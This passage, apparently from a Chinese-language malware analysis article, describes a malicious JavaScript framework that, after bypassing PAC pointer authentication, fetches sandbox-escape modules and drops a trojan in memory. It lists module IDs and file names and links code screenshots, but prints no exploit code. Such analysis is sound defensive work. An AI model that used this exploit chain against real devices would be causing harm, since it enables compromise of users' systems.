leaf="">17480ecc0120292fb6b8b19f2fa134385dcfd0fd.js</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;"><section><span leaf="">91b278ddb2aec817b10c1535e0963da74f9b8eeb</span></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;"><section><span leaf="">f6377d5d458183d41c5fd99661c5a306b42c6255.js</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: #F8F8F8;"><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;"><section><span leaf="">b586c88246144bc7975ad4e27ec6d62716bf34ea</span></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;"><section><span leaf="">3bc0f6865c0476c0a98a76cb9924d6b3972df591.js</span></section></td></tr></tbody></table>  
相关代码截图如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/88xeNEUh1GxichRmUzXlk4KghYuxlhx8NWOmicic3v8AricLvj8OLP69FsopJ6PpoSLpdsIxV4OAuSQPfsVP2Pjlf0bict1Y7Gu18uibWTAGhlNwA/640?wx_fmt=png&from=appmsg "")  
  
外联模块URL截图如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/88xeNEUh1Gw8ekaLFXVh5Ulns6uyavPHHGBTH7jC2DKzKujRSkiaoiasOj0hEwQ26LwqkdxpnialwnNBSTZiaG39e11L9ukCAoZpTFKv7uzPIiaU/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/88xeNEUh1GwZmNpxhmpLniamDKj9hnIcGzZELTfxAcLPVdnQmQWl7OicmiaQWsRG0xTtuFfv3Xl42O5VtB36mPQu3F1dxsL5Bk4LMLZbbyiaX6g/640?wx_fmt=png&from=appmsg "")  
### 沙箱逃逸+投递有效载荷  
  
通过分析，成功实现PAC指针认证绕过后，恶意JavaScript框架又将外联对应的沙箱逃逸利用模块，模块利用成功后，则将在内存中投递后续有效木马载荷。  
  
模块ID与模块URL的对应关系如下：  
<table><thead><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><th style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-weight: bold;background-color: #f0f0f0;font-size: 14px;color: #595959;"><section><span leaf="">模块ID</span></section></th><th style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-weight: bold;background-color: #f0f0f0;font-size: 14px;color: #595959;"><section><span leaf="">模块URL</span></section></th></tr></thead><tbody><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;"><section><span leaf="">7f809f320823063b55f26ba0d29cf197e2e333a8</span></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;"><section><span leaf="">8835419f53fa3b270c8928d53f012d4c28b29ea4.js</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: #F8F8F8;"><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;"><section><span leaf="">c03c6f666a04dd77cfe56cda4da77a131cbb8f1c</span></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;color: #595959;"><section><span leaf="">9af53c1bb40f0328841df6149f1ef94f5336ae11.js</span></section></td></tr></tbody></table>  
相关代码截图如下：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/88xeNEUh1GxpHOQGz7zqVuFb2QDsDymiaGYZmMSibj2jIwgic5YFYVTCbxMVPgLBAick7iakCpDsWPc0S4Z4NjbxRRmzj6Hg0ibkhgqJ1t0IN8XLk/640?wx_fmt=png&from=appmsg "")  
  
外联模块URL截图如下：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/88xeNEUh1GwBicegSlubUYDJXP3TzWRkuXicRxndtsKWebH27sTmNKMYiabqXVF0sq3ibVXYE4XILfapU1YmIZc3CNIhF7UMFZ4XgJJQ7GeQSKE/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/88xeNEUh1GzPOvyyT4V551gcpxeibbfFibpB1crOpQZpsJL6663Pqib0ugmtS4hxQ59hZ5ibc8KRuYUbGzFdRKWmRibn016Gickppo1q6IiaL610rw/640?wx_fmt=png&from=appmsg "")  
  
  
  
